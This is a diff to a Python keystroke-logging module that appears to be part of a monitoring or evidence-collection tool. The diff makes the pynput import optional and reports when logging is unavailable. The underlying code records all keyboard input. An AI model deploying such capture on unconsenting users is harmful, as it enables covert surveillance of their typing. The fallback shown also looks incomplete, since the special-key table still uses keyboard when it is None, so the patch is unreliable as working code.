@@ -5,11 +5,17 @@ Records all keyboard input organized by minute
 import threading
 from datetime import datetime
 from pathlib import Path
-from pynput import keyboard
 from typing import Optional
 from event_bus import Event, event_bus
 from config import config
 from database import EvidenceDatabase
+
+try:
+    from pynput import keyboard
+    PYNPUT_OK = True
+except ImportError:
+    keyboard = None
+    PYNPUT_OK = False
 
 
 class KeyboardModule:
@@ -23,7 +29,8 @@ class KeyboardModule:
         self._running = False
         self._stop_event = threading.Event()
         self._last_minute = [None]
-        self._listener: Optional[keyboard.Listener] = None
+        self._listener: Optional['keyboard.Listener'] = None
+        self._keyboard_ok = PYNPUT_OK
         
         self._special_keys = {
             keyboard.Key.space: " ",
@@ -77,6 +84,15 @@ class KeyboardModule:
                 event_type="KEYSTROKE_SKIP",
                 priority="INFO",
                 detail="Keystroke logging disabled in config",
+                source="keyboard"
+            ))
+            return
+
+        if not self._keyboard_ok:
+            event_bus.publish(Event(
+                event_type="KEYSTROKE_SKIP",
+                priority="INFO",
+                detail="pynput not installed; keystroke logging unavailable",
                 source="keyboard"
             ))
             return
